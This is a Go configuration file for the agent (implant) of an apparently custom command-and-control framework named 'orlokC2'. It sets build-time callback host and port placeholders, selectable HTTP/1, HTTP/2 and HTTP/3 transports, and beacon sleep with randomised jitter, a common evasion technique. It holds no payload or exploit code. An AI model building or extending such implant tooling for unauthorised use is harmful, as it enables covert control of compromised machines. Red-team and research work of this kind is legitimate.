package config

import (
	"fmt"
	"math/rand"
	"time"

	"orlokC2_final/internal/types"
)

// AgentConfig holds all configuration parameters for the agent
type AgentConfig struct {
	// Server connection details
	TargetHost string
	TargetPort int
	Protocol   types.ProtocolType

	// Connection behavior
	ConnectionTimeout time.Duration
	RequestTimeout    time.Duration
	ReconnectDelay    time.Duration

	// Operational behavior
	Sleep  time.Duration
	Jitter float64 // As a percentage (0-100)

	// Identity
	AgentUUID string
}

// DefaultConfig returns a configuration with sensible default values
func DefaultConfig() *AgentConfig {
	cfg := &AgentConfig{
		// Use embedded values if they're not placeholders
		TargetHost:        EmbeddedValues.TargetHost,
		TargetPort:        EmbeddedValues.TargetPort,
		ConnectionTimeout: 2 * time.Minute,
		RequestTimeout:    1 * time.Minute,
		ReconnectDelay:    10 * time.Second,
		AgentUUID:         EmbeddedValues.AgentUUID,
	}

	// Set Protocol based on embedded string
	if EmbeddedValues.Protocol != "PLACEHOLDER_PROTOCOL" {
		switch EmbeddedValues.Protocol {
		case "H1C":
			cfg.Protocol = types.H1C
		case "H1TLS":
			cfg.Protocol = types.H1TLS
		case "H2C":
			cfg.Protocol = types.H2C
		case "H2TLS":
			cfg.Protocol = types.H2TLS
		case "H3":
			cfg.Protocol = types.H3
		}
	} else {
		cfg.Protocol = types.H1C
	}

	// Set Sleep and Jitter
	if EmbeddedValues.Sleep != 0 {
		cfg.Sleep = time.Duration(EmbeddedValues.Sleep) * time.Second
	} else {
		cfg.Sleep = 10 * time.Second
	}

	if EmbeddedValues.Jitter != 0 {
		cfg.Jitter = float64(EmbeddedValues.Jitter)
	} else {
		cfg.Jitter = 50.0
	}

	// Use default values for anything that's still a placeholder
	if cfg.TargetHost == "PLACEHOLDER_HOST" {
		cfg.TargetHost = "localhost"
	}

	if cfg.TargetPort == 0 {
		cfg.TargetPort = 7777
	}

	if cfg.AgentUUID == "PLACEHOLDER_UUID" {
		cfg.AgentUUID = "00000000-0000-0000-0000-000000000000"
	}

	return cfg
}

// CalculateSleepWithJitter returns the sleep duration with jitter applied
func (c *AgentConfig) CalculateSleepWithJitter() time.Duration {
	// Apply jitter as a percentage of the base sleep time
	jitterFactor := 1.0 + (rand.Float64() * c.Jitter / 100.0)
	return time.Duration(float64(c.Sleep) * jitterFactor)
}

// GetTargetAddress returns the full address (host:port) for the target
func (c *AgentConfig) GetTargetAddress() string {
	return fmt.Sprintf("%s:%d", c.TargetHost, c.TargetPort)
}
